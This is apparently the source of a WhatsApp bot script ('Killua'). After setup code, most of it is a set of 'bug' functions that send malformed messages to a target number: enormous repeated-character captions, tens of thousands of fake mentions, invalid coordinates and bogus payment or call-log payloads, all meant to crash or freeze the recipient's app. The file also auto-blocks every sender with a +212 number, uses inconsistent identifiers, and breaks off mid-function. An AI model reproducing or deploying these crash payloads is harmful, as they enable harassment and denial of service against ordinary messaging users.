// SPECIAL SCRIPT BY KILLUA
//SUPPORT ©WANZOFC
module.exports = async (killua, m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us')
const botNumber = await killusXs.decodeJid(dhikaXs.user.id)
const sender = m.key.fromMe ? (killuaXs.user.id.split(':')[0]+'@s.whatsapp.net' || killuaXs.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await killuaXs.groupMetadata(m.chat).catch(e => {}) : ''
//const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const totalFitur = () =>{
            var mytext = fs.readFileSync("./ebpcrash.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const { Client } = require('ssh2');
const jsobfus = require('javascript-obfuscator');
const { addSaldo, minSaldo, cekSaldo } = require("./database/dtbs/deposit");
const { mediafireDl } = require('./database/dtbs/mediafire.js') 
let db_saldo = JSON.parse(fs.readFileSync("./database/dtbs/saldo.json"));
const { beta1, beta2, buk1 } = require("./database/lib/hdr.js")
const { generateProfilePicture, reSize } = require('./database/lib/myfunction.js')
const xbug = fs.readFileSync(`./database/image/xbug.jpg`)
const Xynz = fs.readFileSync(`./database/image/Xynz.jpg`) 
const zkosong = fs.readFileSync(`./database/image/zkosong.png`)
const func = require("./database/place")
const usePairingCode = true
const fetch = require('node-fetch')

const bugres = '`<★>` _Done Sending Bug Using New Bug Chek Target Message To See The Bug is Working Or Not._'

// VIRTEX
		const {
			ios
		} = require("./database/virtex/ios.js")
		const {
			telapreta3
		} = require("./database/virtex/telapreta3.js")
		const {
			convite
		} = require("./database/virtex/convite.js")
		const {
			bugpdf
		} = require("./database/virtex/bugpdf.js")
		const {
			cP
		} = require('./database/virtex/bugUrl.js')
	
// Auto Blocked Nomor +212
if (m.sender.startsWith('212')) return killuaXs.updateBlockStatus(m.sender, 'block')
function sleep(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
    }
// auto anti bug
if (global.antibug) {
if (!isGroup && m.isBaileys && m.fromMe) {
await killuaXs.sendMessage(m.chat, {
delete: {
remoteJid: m.chat, fromMe: true, id: m.key.id
}})
await killuaXs.sendMessage(`${global.owner}@s.whatsapp.net`, {text: `*Terdeteksi Pesan Bug*
*Nomor :* ${m.sender.split("@")[0]}`}, {quoted: null})
}}

// Random Color
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

let run = runtime(process.uptime())


// Command Yang Muncul Di Console
if (isCmd) {
console.log(chalk.white.bgRed.bold('Ada Pesan, Om'), color(`[ Message ]`, `green`), color(`FROM`, `red`), color(`${pushname}`, `red`), color(`Text :`, `yellow`), color(`${body}`, `blue`))
}

        // Days
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var ucapanWaktu = 'Selamat Malam 🏙️'
        }
        if (time2 < "19:00:00") {
            var ucapanWaktu = 'Selamat Petang 🌆'
        }
        if (time2 < "18:00:00") {
            var ucapanWaktu = 'Selamat Sore 🌇'
        }
        if (time2 < "15:00:00") {
            var ucapanWaktu = 'Selamat Siang 🌤️'
        }
        if (time2 < "10:00:00") {
            var ucapanWaktu = 'Selamat Pagi 🌄'
        }
        if (time2 < "05:00:00") {
            var ucapanWaktu = 'Selamat Subuh 🌆'
        }
        if (time2 < "03:00:00") {
            var ucapanWaktu = 'Selamat Tengah Malam 🌃'
        }
       
    killuaXs.autoshalat = killuaXs.autoshalat ? killuaXs.autoshalat : {}
    let id = m.chat
    if (id in killuaXs.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if (timeNow === waktu) {
        killuaXs.autoshalat[id] = [
            killuaXs.sendMessage(m.chat, {
audio: {
    url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
},
mimetype: 'audio/mp4',
ptt: true,
contextInfo: {
    externalAdReply: {
        showAdAttribution: true,
        mediaType: 1,
        mediaUrl: '',
        title: `sholat cil ingat tuhan`,
        body: ` `,
        sourceUrl: '',
        thumbnail: await fs.readFileSync('./database/image/jadwal.jpg'),
        renderLargerThumbnail: true
    }
}
            }, {}),
            setTimeout(async () => {
delete client.autoshalat[m.chat]
            }, 57000)
        ]
    }
    }

// Read Database
const contacts = JSON.parse(fs.readFileSync("./database/dtbs/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./database/dtbs/premium.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./database/dtbs/owner.json"))

// Cek Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot

// BUTTON VIDEO
   killuaXs.sendButtonVideo = async (jid, buttons, quoted, opts = {}) => {
      var video = await prepareWAMessageMedia({
         video: {
            url: opts && opts.video ? opts.video : ''
         }
      }, {
         upload: killuasXs.waUploadToServer
      })
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
  body: {
     text: opts && opts.body ? opts.body : ''
  },
  footer: {
     text: opts && opts.footer ? opts.footer : ''
  },
  header: {
     hasMediaAttachment: true,
     videoMessage: video.videoMessage,
  },
  nativeFlowMessage: {
     buttons: buttons,
     messageParamsJson: ''
  }, contextInfo: {
      externalAdReply: {
      title: global.namabot,
      body: `𝐀𝐧𝐭𝐢𝐌𝐚𝐫𝐠𝐚`,
      thumbnailUrl: global.imageurl,
      sourceUrl: global.isLink,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
               
               }
            }
         }
      }, {
         quoted
      })
      await killuaXs.sendPresenceUpdate('composing', jid)
      return killuaXs.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }

   const wanted = {
    key: {
        remoteJid: 'p',
        fromMe: false,
        participant: '0@s.whatsapp.net'
    },
    message: {
        "interactiveResponseMessage": {
            "body": {
                "text": "Sent",
                "format": "DEFAULT"
            },
            "nativeFlowResponseMessage": {
                "name": "galaxy_message",
                "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(1255000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                "version": 3
            }
        }
    }
}	

// FUNCTION BUG iOS
async function iOSxCRASH(LockJids) {
			await TheAlwaysFaxzDevoloper.relayMessage(LockJids, {
				"paymentInviteMessage": {
					serviceType: "FBPAY",
					expiryTimestamp: Date.now() + 1814400000
				}
			}, {
				participant: {
					jid: LockJids
				}
			})
			console.log(chalk.green("Sending Bug By ÂlwaysFaxz🔥"));
		};

		async function iOSxVIRUS(jid) {
			TheAlwaysFaxzDevoloper.relayMessage(jid, {
				'extendedTextMessage': {
					'text': '.',
					'contextInfo': {
						'stanzaId': jid,
						'participant': jid,
						'quotedMessage': {
							'conversation': ' ⟅̊༑ ▾ ⌜ 𝐀𝐥𝐰𝐚𝐲𝐬𝐅𝐚𝐱𝐳 メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': jid
				}
			}, {
				'messageId': null
			});
			console.log(chalk.green("Sending Bug By ÂlwaysFaxz🔥"));
		};

		async function iOSxPAY(jid) {
			TheAlwaysFaxzDevoloper.relayMessage(jid, {
				'paymentInviteMessage': {
					'serviceType': "UPI",
					'expiryTimestamp': Date.now() + 86400000
				}
			}, {
				'participant': {
					'jid': jid
				}
			});
			console.log(chalk.green("Sending Bug By ÂlwaysFaxz🔥"));
		};


		// Func Bug By Dhika
		// Edit = Yatim + Maklu Mati
		// Don't re-edit guys:)
		async function tamaLoca(target) {
            let virtex = "⩟⬦𪲁 ͢𝐀͠𝐗͜͢𝐒 -";
            let memekz = Date.now();

            await dhikaXs.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                locationMessage: {
                                    degreesLatitude: -999.03499999999999,
                                    degreesLongitude: 999.03499999999999
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "⩟⬦𪲁 𝐗͜͢ -" + "ꦾ".repeat(50000) + "@1".repeat(203000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "killuaXsENTRY" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });            
            console.log(chalk.green(" killuaBugs : Attacking "))
        }
       
  async function ngeloc(target, kuwoted) {
  var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  viewOnceMessage: {
  message: {
  "liveLocationMessage": {
  "degreesLatitude": "p",
  "degreesLongitude": "p",
  "caption": "⚡killuaXcrash⚡"+"ꦾ".repeat(50000),
  "sequenceNumber": "0",
  "jpegThumbnail": ""
   }
  }
  }
  }), { userJid: target, quoted: kuwoted })
  await dhikaXs.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
  }
//SPAMMING FLOODS\\
async function sendLoc(LockJids, QUOTED) {
    var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          "liveLocationMessage": {
            "degreesLatitude": "x",
            "degreesLongitude": "x",
            "caption": '͟͟͞͞🩸⃟༑⌁⃰ ⟅̊༑ ▾ ⌜ alwaysdkk ⌟ ▾ ༑̴⟆̤̊★🍂' + "★ꦾ".repeat(900000),
            "sequenceNumber": "0",
            "jpegThumbnail": ""
          }
        }
      }
    }), {
      userJid: LockJids,
      quoted: QUOTED
    });
    await dhikaXs.relayMessage(LockJids, etc.message, {
      messageId: etc.key.id
    });
  }
  
  async function invisIos(jid, Ptcp = false) {
    await dhikaXs.relayMessage(jid, {
      extendedTextMessage: {
        text: '༑KilluaCrashV6ཀ',
        contextInfo: {
          mentionedJid: ["2435074413@s.whatsapp.net", ...Array.from({
            length: 30000
          }, () => "1" + Math.floor(Math.random() * 9999999) + "@s.whatsapp.net")],
          stanzaId: "EXTREME1234567890ABCDEF",
          participant: "0@s.whatsapp.net",
          quotedMessage: {
            callLogMessage: {
              isVideo: false,
              callOutcome: "9999",
              durationSecs: "0",
              callType: "REGULAR",
              participants: Array.from({
                length: 99999
              }, () => ({
                jid: "0@s.whatsapp.net",
                callOutcome: "1"
              }))
            }
          },
          remoteJid: jid,
          conversionSource: "Ultimate Enhanced X",
          conversionData: "Super extended encoded data, adding even more data to intensify processing overload...",
          conversionDelaySeconds: 5,
          forwardingScore: 999999999,
          isForwarded: true,
          quotedAd: {
            advertiserName: "Ultimate Data X",
            mediaType: "VIDEO",
            jpegThumbnail: "UltraExtendedThumbnailDataLonger/9j/4AAQSkZ...",
            caption: "Extreme Caption to further increase processing",
            campaignId: "MegaCampaign2023"
          },
          placeholderKey: {
            remoteJid: "0@s.whatsapp.net",
            fromMe: false,
            id: "EXTENDED_ID_FOR_SUPER_TEST_1234567890"
          },
          expiration: 3456477523543275000,
          ephemeralSettingTimestamp: "Maxed Timestamp",
          ephemeralSharedSecret: "ULTIMATE_ULTRA_SHARING_SECRET",
          externalAdReply: {
            title: "༑KilluaCrashV6ཀ",
            body: "💀 ༑KilluaCrashV6ཀ 💀",
            mediaType: "VIDEO",
            renderLargerThumbnail: true,
            previewType: "VIDEO",
            thumbnail: "ExtendedThumbnail",
            sourceType: "MAX Source",
            sourceId: "ExtendedSourceID",
            sourceUrl: "https://example.com/ExtendedURL",
            mediaUrl: "https://example.com/ExtendedMedia",
            containsAutoReply: true,
            showAdAttribution: true,
            ctwaClid: "Extended_ctwa_clid",
            ref: "ExtendedRef",
            largeImagePreviewUrl: "https://example.com/LargePreviewImage"
          },
          entryPointConversionSource: "ultimate_entry_point",
          entryPointConversionApp: "Extended Ultimate App",
          entryPointConversionDelaySeconds: 1,
          disappearingMode: {},
          actionLink: {
            url: "https://example.com/ExtendedActionLink"
          },
          groupSubject: "Ultimate Maximum Subject",
          parentGroupJid: "243975074413-EXTREME_TEST_GROUP@g.us",
          trustBannerType: "Ultimate Extreme Trust",
          trustBannerAction: 4,
          isSampled: true,
          utm: {
            utmSource: "Extended Ultimate Source",
            utmCampaign: "Extended Ultimate Campaign"
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: "243975074413-EXTENDED_TEST_NEWS@g.us",
            serverMessageId: 4,
            newsletterName: "Extended Ultimate Newsletter",
            contentType: "Extended Content",
            accessibilityText: "Extended Extreme Text"
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "ExtendedOwner@s.whatsapp.net"
          },
          smbClientCampaignId: "Extended_client_campaign_id",
          smbServerCampaignId: "Extended_server_campaign_id",
          dataSharingContext: {
            showMmDisclosure: true,
            privacyPolicyUrl: "https://example.com/ExtendedPrivacyPolicy"
          },
          locationMessage: {
            degreesLatitude: 0,
            degreesLongitude: 0,
            name: "༑KilluaCrashV6ཀ\n" + "ꦾ".repeat(920000),
            url: "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.tiktok.com/login&ved=2ahUKEwjoofub_LaJAxV0VWwGHRbTE5sQFnoECAsQAQ&usg=AOvVaw2iyH8WQ2LCBOlE_xMJEbJK\n" + "ꦾ࣯".repeat(74000),
            jpegThumbnail: "UltraExtendedThumbnailDataLonger/9j/4AAQSkZ..."
          }
        }
      }
    }, Ptcp ? {
      participant: {
        jid: jid
      }
    } : {});
    console.log(chalk.blue("KilluaBugs : Attacking"));
  }

  async function StukLoc(jid, qtd, tHm, Ptcp = false) {
    const _0x4a8e9e = {
      text: "༑KilluaCrashV6ཀ"
    };
    let etc = generateWAMessageFromContent(jid, proto.Message.fromObject({
      'ephemeralMessage': {
        'message': {
          'interactiveMessage': {
            'header': {
              'title': "༑KilluaCrashV6ཀ̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏" + bugpdf,
              'locationMessage': {
                'degreesLatitude': -999.035,
                'degreesLongitude': 922.999999999999,
                'name': "༑KilluaCrashV6ཀ",
                'address': "༑KilluaCrashV6ཀ",
                'jpegThumbnail': tHm
              },
              'hasMediaAttachment': true
            },
            'body': _0x4a8e9e,
            'nativeFlowMessage': {
              'messageParamsJson': " 𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️ ",
              'buttons': [{
                'name': "single_select",
                'buttonParamsJson': {
                  'title': "༑KilluaCrashV6ཀ",
                  'sections': [{
                    'title': "༑KilluaCrashV6ཀ",
                    'rows': []
                  }]
                }
              }, {
                'name': "call_permission_request",
                'buttonParamsJson': {}
              }]
            }
          }
        }
      }
    }), {
      'userJid': jid,
      'quoted': qtd
    });
    await dhikaXs.relayMessage(jid, etc.message, Ptcp ? {
      'participant': {
        'jid': jid
      }
    } : {});
    console.log(chalk.green("KilluaBugs : Attacking "));
  } ;

  async function CallCrash(jid, ptcp = false) {
    await dhikaXs.relayMessage(jid, {
      extendedTextMessage: {
        text: "KilluaCrashV6",
        contextInfo: {
          stanzaId: "1234567890ABCDEF",
          participant: "62895364760801@s.whatsapp.net",
          quotedMessage: {
            callLogMesssage: {
              isVideo: true,
              callOutcome: "9999",
              durationSecs: "0",
              callType: "REGULAR",
              participants: [{
                jid: "62895364760801@s.whatsapp.net",
                callOutcome: "1"
              }]
            }
          },
          remoteJid: jid,
          conversionSource: "source_example",
          conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
          conversionDelaySeconds: 10,
          forwardingScore: 99999999,
          isForwarded: true,
          quotedAd: {
            advertiserName: "Example Advertiser",
            mediaType: "IMAGE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
            caption: "This is an ad caption"
          },
          placeholderKey: {
            remoteJid: "62895364760801@s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          },
          expiration: 86400,
          ephemeralSettingTimestamp: "1728090592378",
          ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
          externalAdReply: {
            title: "Killuaxn",
            body: "☠️ KilluaCrashV6 ☠️",
            mediaType: "VIDEO",
            renderLargerThumbnail: true,
            previewTtpe: "VIDEO",
            thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
            sourceType: " x ",
            sourceId: " x ",
            sourceUrl: "https://www.instagram.com/WhatsApp",
            mediaUrl: "https://www.instagram.com/WhatsApp",
            containsAutoReply: true,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            ctwaClid: "ctwa_clid_example",
            ref: "ref_example"
          },
          entryPointConversionSource: "entry_point_source_example",
          entryPointConversionApp: "entry_point_app_example",
          entryPointConversionDelaySeconds: 5,
          disappearingMode: {},
          actionLink: {
            url: "https://wa.me/settings"
          },
          groupSubject: "Example Group Subject",
          parentGroupJid: "6287888888888-1234567890@g.us",
          trustBannerType: "trust_banner_example",
          trustBannerAction: 1,
          isSampled: false,
          utm: {
            utmSource: "utm_source_example",
            utmCampaign: "utm_campaign_example"
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: "6287888888888-1234567890@g.us",
            serverMessageId: 1,
            newsletterName: " X ",
            contentType: "UPDATE",
            accessibilityText: " X "
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net"
          },
          smbClientCampaignId: "smb_client_campaign_id_example",
          smbServerCampaignId: "smb_server_campaign_id_example",
          dataSharingContext: {
            showMmDisclosure: true
          }
        }
      }
    }, ptcp ? {
      participant: {
        jid: jid
      }
    } : {});
    console.log(chalk.blue("KilluaBugs : Attacking "));
  };

  async function CrashUi(X, Qtd, ThM, cct = false, ptcp = false) {
    let etc = generateWAMessageFromContent(X,
      proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 9007199254740991,
                  mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                  fileName: "DhikaCrashV6",
                  fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                  directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1723855952",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: ThM
                },
                hasMediaAttachment: true
              },
              body: {
                text: "⭑̤⟅̊༑ KilluaCrashV6 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤" + ''.repeat(900000)
              },
              nativeFlowMessage: {
                messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
                buttons: [
                  cct ? {
                    name: "single_select",
                    buttonParamsJson: "{\"title\":\"✨⃟༑KilluaFusionϟ〽️" + "\0".repeat(300000) + "\",\"sections\":[{\"title\":\"𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
                  } : {
                    name: "payment_method",
                    buttonParamsJson: ""
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "{}"
                  },
                  {
                    name: "payment_method",
                    buttonParamsJson: "{}"
                  },
                  {
                    name: "single_select",
                    buttonParamsJson: "{\"title\":\"✨⃟༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ ϟ〽️\",\"sections\":[{\"title\":\"KilluaFusionϟ\",\"rows\":[]}]}"
                  },
                  {
                    name: "galaxy_message",
                    buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
                  }
                ]
              }
            }
          }
        }
      }), {
        userJid: X,
        quoted: Qtd
      }
    );

    await dhikaXs.relayMessage(X, etc.message, ptcp ? {
      participant: {
        jid: X
      }
    } : {});
    console.log(chalk.green("KilluaBugs : Attacking "));
  };

  async function TxOs(X, Ptcp = false) {
    await dhikaXs.relayMessage(X, {
        extendedTextMessage: {
          text: "KilluaCrashV6\n" + "@null".repeat(150000),
          contextInfo: {
            mentionedJid: [
              "6281991410@s.whatsapp.net",
              ...Array.from({
                length: 15000
              }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
            ],
            stanzaId: "1234567890ABCDEF",
